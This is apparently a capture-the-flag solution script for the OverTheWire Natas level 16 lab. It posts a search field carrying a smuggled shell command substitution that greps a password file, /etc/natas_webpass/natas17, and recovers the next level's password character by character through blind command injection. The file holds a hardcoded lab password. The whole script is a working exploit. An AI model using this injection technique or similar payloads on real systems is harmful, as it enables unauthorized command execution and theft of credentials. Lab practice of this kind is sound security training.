#!/usr/bin/env python3

import requests
import re
import string
req = requests.Session()

s= string.ascii_letters+string.digits

username = "natas16"
password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
url = "http://%s.natas.labs.overthewire.org/" % username

# # data = {"needle":"hellos"}
# req_post = req.post(url,auth=(username,password),data=data)
# print(req_post.text)

passwordd=""

while len(passwordd)!=32:
	for i in s:
		payload = passwordd+i
		data = {"needle":"hellos$(grep ^"+payload+" /etc/natas_webpass/natas17)"}
		req_post = req.post(url,auth=(username,password),data=data)
		print("Trying...",payload)
		if ("hellos" not in req_post.text):
			passwordd+=i
			break
print(passwordd)
